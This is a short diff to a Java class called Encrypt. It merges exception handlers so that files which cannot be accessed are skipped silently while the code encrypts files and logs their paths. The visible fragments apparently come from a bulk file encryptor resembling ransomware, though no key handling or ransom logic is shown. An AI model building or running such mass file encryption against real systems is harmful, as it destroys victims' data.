@@ -4,7 +4,6 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileWriter;
-import java.nio.file.AccessDeniedException;
 import java.nio.file.FileSystemException;
 import java.nio.file.Files;
 import java.util.ArrayList;
@@ -43,8 +42,7 @@ public class Encrypt {
                             try {
                                 encryptFile(file);
                                 encryptedFiles.add(file.getAbsolutePath());
-                            } catch (AccessDeniedException e) {
-                            } catch (FileSystemException e) {
+                            } catch (FileSystemException ignored) {
                             }
                             break;
                         }
@@ -53,7 +51,6 @@ public class Encrypt {
             }
         }
     }
-
 
     private static void encryptFile(File file) throws Exception {
         byte[] fileContent = Files.readAllBytes(file.toPath());
